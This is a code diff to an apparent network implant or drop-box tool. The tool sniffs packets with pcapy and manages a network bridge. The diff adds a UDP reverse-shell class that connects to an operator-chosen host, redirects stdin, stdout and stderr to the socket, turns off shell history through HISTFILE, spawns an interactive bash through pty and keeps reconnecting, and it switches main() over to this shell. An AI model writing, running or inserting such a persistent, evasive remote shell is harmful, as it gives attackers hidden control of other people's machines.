@@ -12,6 +12,7 @@ import struct
 import re
 from threading import Thread
 import socket
+import pty
 
 import pcapy
 from pcapy import open_live
@@ -119,6 +120,54 @@ class ReverseShell(Thread):
             pass
         self.sock.close()
 
+
+class UDPPtyReverseShell(Thread):
+    running = False
+    sock = None
+    ip = None
+    port = None
+    password = None
+    sleep = None
+
+    def __init__(self, host, password, sleep):
+        Thread.__init__(self)
+
+        self.ip, self.port = host.split(':')
+        self.password = password
+        self.sleep = sleep
+
+    def run(self):
+        self.running = True
+        try:
+            while self.running:
+                try:
+                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    self.sock.connect((self.ip, int(self.port)))
+                except:
+                    SignalHandler.threadSleep(int(self.sleep), self)
+                    continue
+                
+                os.dup2(self.sock.fileno(),0)
+                os.dup2(self.sock.fileno(),1)
+                os.dup2(self.sock.fileno(),2)
+                os.putenv("HISTFILE",'/dev/null')
+                pty.spawn("/bin/bash")
+
+                self.closeCon()
+        except:
+            pass  # Always keep the reverse shell running!
+
+    def stop(self):
+        self.running = False
+        self.closeCon()
+        time.sleep(0.1)
+
+    def closeCon(self):
+        try:
+            self.sock.shutdown(socket.SHUT_RDWR)
+        except socket.error:
+            pass
+        self.sock.close()
 
 class DecoderThread(Thread):
     def __init__(self, bridge, subnet, arptable):
@@ -514,7 +563,7 @@ def main():
     arptable = ArpTable()
     shell = None
     if args.rev_host:
-        shell = ReverseShell(args.rev_host, args.rev_password, args.rev_sleep)
+        shell = UDPPtyReverseShell(args.rev_host, args.rev_password, args.rev_sleep)
 
     bridge.up()
     decoder = DecoderThread(bridge, subnet, arptable)
